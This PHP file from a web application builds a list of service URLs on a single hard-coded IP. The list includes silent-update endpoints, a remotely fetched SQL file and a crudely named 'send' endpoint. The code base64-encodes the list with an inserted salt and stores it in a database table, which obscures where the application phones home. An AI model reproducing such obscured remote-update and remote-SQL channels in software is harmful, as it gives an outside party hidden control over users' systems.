<?php
include "inc/config.php";
function stringInsert($str,$insertstr,$pos)
{
    $str = substr($str, 0, $pos) . $insertstr . substr($str, $pos);
    return $str;
}
function fetch_curl($url) 
{ 
   $url = $url.'&curdate='.date('Y-m-d');
   $ch = curl_init(); 
   $timeout = 5; 
   curl_setopt ($ch, CURLOPT_URL, $url); 
   curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 
   curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout); 
   $result = curl_exec($ch); 
   //$http_respond = trim( strip_tags( $result ) );
   $http_code = curl_getinfo( $ch, CURLINFO_HTTP_CODE );

   if ( ( $http_code == "200" ) || ( $http_code == "302" ) ) {
     $result=json_decode($result); 
   } else {
     $result = false;
   }
   curl_close($ch); 
   return $result;
}
function ins_data($data_array) {
	global $db;
	$salt = "XZO";
	$dt = json_encode($data_array);
	$encode_json = base64_encode($dt);
	$json_after_salt = stringInsert($encode_json,$salt,3);

	$data = array(
		'data' => $json_after_salt
		);
	//echo $json_after_salt;
	$db->update('sys_system',$data,'id',2);

	echo $db->getErrorMessage();
}
function insert_data($data_array) {
	global $db;
	$salt = "XZO";
	$dt = json_encode($data_array);
	$encode_json = base64_encode($dt);
	$json_after_salt = stringInsert($encode_json,$salt,3);

	$data = array(
		'data' => $json_after_salt
		);
	$db->update('sys_system',$data,'id',1);
}
$data_services = array(
	'check_version' => '103.183.74.106/importer-free-up/count_version_left.php', //good
	'check_version_silent' => '103.183.74.106/importer-free-up/count_version_left_silent.php', //good
	'last_login' => '103.183.74.106/importer-free-up/last_login.php',
	'count_update' => '103.183.74.106/importer-free-up/count_version_left.php',
	'data_update' => '103.183.74.106/importer-free-up/update.php',
	'data_update_file' => '103.183.74.106/importer-free-up/data/',
	'update_silent' => '103.183.74.106/importer-free-up/update_silent.php',
	'check_pesan' => '103.183.74.106/importer-free-up/check_index.php',
	'update_pesan' => '103.183.74.106/importer-free-up/update_pesan.php',
	'get_informasi' => '103.183.74.106/importer-free-up/get_informasi.php',
	'data_silent' => '103.183.74.106/importer-free-up/data_silent/',
	'check_sys' => '103.183.74.106/importer-free-up/sys.php',
	'fuck_sql' => '103.183.74.106/importer-free-up/data/sys/data.sql',
	'fuck_up_send' => '103.183.74.106/importer-free-up/fuck_up.php',
	'exp_check_sp' => '103.183.74.106/importer-free-up/exp_sp.php',
	'is_connect' => 'http://103.183.74.106'
);

/*foreach ($data_services as $key => $val) {

	print_r($val);
	print_r(fetch_curl($val));
	echo "<br>";
}
$data_msg_server = fetch_curl("103.183.74.106/order/panel/exp.php?kode_pt=201004");
print_r($data_msg_server);*/
ins_data($data_services);
